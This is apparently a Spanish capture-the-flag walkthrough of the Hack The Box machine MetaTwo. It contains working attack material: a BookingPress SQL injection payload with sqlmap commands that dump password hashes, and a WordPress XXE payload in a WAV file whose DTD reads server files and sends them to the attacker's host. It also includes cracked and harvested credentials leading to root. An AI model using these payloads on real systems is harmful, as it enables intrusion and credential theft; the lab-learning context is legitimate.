10.10.11.186 - MetaTwo
----------------------

Puertos abiertos -> 21, 22, 80
```console
└─$ whatweb http://10.10.11.186             
http://10.10.11.186 [302 Found] HTTPServer[nginx/1.18.0], IP[10.10.11.186], RedirectLocation[http://metapress.htb/], Title[302 Found], nginx[1.18.0]
ERROR Opening: http://metapress.htb/ - no address for metapress.htb
```
Añadimos al /etc/hosts el dominio y repetimos el escaneo.
```console
└─$ whatweb http://metapress.htb
Cookies[PHPSESSID], HTTPServer[nginx/1.18.0], MetaGenerator[WordPress 5.6.2], PHP[8.0.24], 

└─$ wfuzz -t 200 --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 'http://metapress.htb/FUZZ.php'
000000001:   301        0 L      0 W        0 Ch        "index"
000000463:   200        96 L     429 W      6931 Ch     "wp-login"
000017037:   405        0 L      6 W        42 Ch       "xmlrpc"
000046014:   302        0 L      0 W        0 Ch        "wp-signup" 

└─$ wfuzz -t 200 --hc=404,301 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 'http://metapress.htb/FUZZ/'
000000041:   302        0 L      0 W        0 Ch        "login"
000000050:   200        1033 L   3343 W     74090 Ch    "events"
000000112:   200        155 L    552 W      10342 Ch    "0"
000000114:   200        50 L     114 W      1763 Ch     "feed"
000000229:   200        0 L      0 W        0 Ch        "wp-content"
000000247:   302        0 L      0 W        0 Ch        "admin"
000000774:   403        7 L      9 W        153 Ch      "wp-includes"
000001107:   200        153 L    534 W      10326 Ch    "about-us"
000001143:   200        1033 L   3343 W     74090 Ch    "Events"
```
Nos encontramos los clasicos directorios de un wordpress.


La web es esta:

Hay abajo un panel de busqueda que tramita una petición tal que así: 
```/GET http://metapress.htb/?s=test```

De hacer fuzzing a las paginas ```http://metapress.htb/?s=FUZZ``` pero consigo siempe las mimas cuatro que no
tienen nada interesante

Si hago fuzzing por el wp-content ```http://metapress.htb/wp-content/FUZZ/```
Sale lo tipico, /about /events /feed /themes /plugins y /uploads que devuelve un 403 forbiden.

La pagina de events tramita una peticion POST a http://metapress.htb/wp-admin/admin-ajax.php con un montón de 
datos. En el codigo fuente de /events si buscamos por urls obtenemos:
```
└─$ curl -s http://metapress.htb/events/ | grep -oE '"http://(.*?)"'
# .../wp-content/plugins/bookingpress-appointment-booking/images/data-grid-empty-view-vector.webp
```

Buscando como explotar esto di [con](https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357)

Extraer el "nonce"
```console
└─$ curl -s http://metapress.htb/events/ | grep "nonce"
ar postData = { action:'bookingpress_generate_spam_captcha', _wpnonce:'4d058944b8' };

└─$ curl -s 'http://metapress.htb/wp-admin/admin-ajax.php' \
-d $'action=bookingpress_front_get_category_services&_wpnonce=4d058944b8&category_id=33&total_service=1) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -' | jq
# informacion de version y demas
```

```console
└─$ sqlmap -u 'http://metapress.htb/wp-admin/admin-ajax.php' --method POST --data  'action=bookingpress_front_get_category_services&_wpnonce=4d058944b8&category_id=33&total_service=1' -p total_service --dbs
[*] blog
[*] information_schema

└─$ sqlmap -u 'http://metapress.htb/wp-admin/admin-ajax.php' --method POST --data  'action=bookingpress_front_get_category_services&_wpnonce=4d058944b8&category_id=33&total_service=1' -p total_service -D blog --tables
# wp-users

└─$ sqlmap -u 'http://metapress.htb/wp-admin/admin-ajax.php' --method POST --data  'action=bookingpress_front_get_category_services&_wpnonce=4d058944b8&category_id=33&total_service=1' -p total_service -D blog -T wp_users --dump
# admin -> $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
# manager -> $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70

└─$ john -w=/usr/share/wordlists/rockyou.txt hashes
partylikearockstar (?) # manager
```
Solo podemos crackear la de manager con el jhon ```john -w=/usr/share/wordlists/rockyou.txt hashes```
Y nos da "partylikearockstar". Entramos a wp-admin (wp-login.php) con esas creds manager:partylikearockstar

Hay una seccion apra subir archivos (media), buscando ```wordpress media upload vulnerability``` doy con eñ
"WordPress XXE Vulnerability in Media Library – CVE-2021-29447"

```console
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.14.83/wtf.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav

# wtf.dtd
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.83/?p=%file;'>" >
```
El unico usuario que sacamos es "jnelson"
Como el sitio es un nginx antes de probar otras rutas pillamos el "/etc/nginx/sites-enabled/default" 
simplemente cambiando la ruta en "wtf.dtd"

Pone "root /var/www/metapress.htb/blog;" es decir el wordpress esta en esa ruta.
Ahora a "/var/www/metapress.htb/blog/wp-config.php" Y obtenemos:

MySQL -> database blog -> blog:635Aq@TdqrCwXFUZ
FTP -> ftpext metapress.htb:9NYS_ii@FyL_p5M2NvJ

```console
└─$ ftp metapress.htb
Name (metapress.htb:cucuxii): metapress.htb
Password: 9NYS_ii@FyL_p5M2NvJ
ftp> dir
drwxr-xr-x   5 metapress.htb metapress.htb     4096 Oct  5 14:12 blog
drwxr-xr-x   3 metapress.htb metapress.htb     4096 Oct  5 14:12 mailer
ftp> dir blog
# Todo el wordpress
ftp> cd mailer
ftp> dir
drwxr-xr-x   4 metapress.htb metapress.htb     4096 Oct  5 14:12 PHPMailer
-rw-r--r--   1 metapress.htb metapress.htb     1126 Jun 22  2022 send_email.php
ftp> get send_email.php
```

Ahi encontramos las creds de jnelson "jnelson@metapress.htb:Cb4_JmWM8zUZWMu@Ys"
Podemos entrar con ssh ```sshpass -p 'Cb4_JmWM8zUZWMu@Ys' ssh jnelson@metapress.htb```

Si enumeramos el sistema encontramos que:
- Archivos de jnelson -> en su carpeta /home hay muchos ".passpie" con posibles contraseñas

Dentro de passpie:
```console
jnelson@meta2:~/.passpie$ ls -la
-r-xr-x--- 1 jnelson jnelson    3 Jun 26  2022 .config
-r-xr-x--- 1 jnelson jnelson 5243 Jun 26  2022 .keys # dos claves: privada y publica
dr-xr-x--- 2 jnelson jnelson 4096 Oct 25 12:52 ssh # carpeta con password de root convertida en un pgp
```

Copio la clave privada del archivo ".keys" en private.key
```console
└─$ gpg2john private.key > hash
└─$ john hash -w=/usr/share/wordlists/rockyou.txt
# blink182         (Passpie)

```console
jnelson@meta2:~$ touch pass
jnelson@meta2:~$ passpie export pass
Passphrase: blink182 
jnelson@meta2:~$ cat pass
# root: 'p7qfAZt4_A1xo_0x'
jnelson@meta2:~$ su root
Password:  p7qfAZt4_A1xo_0x
```

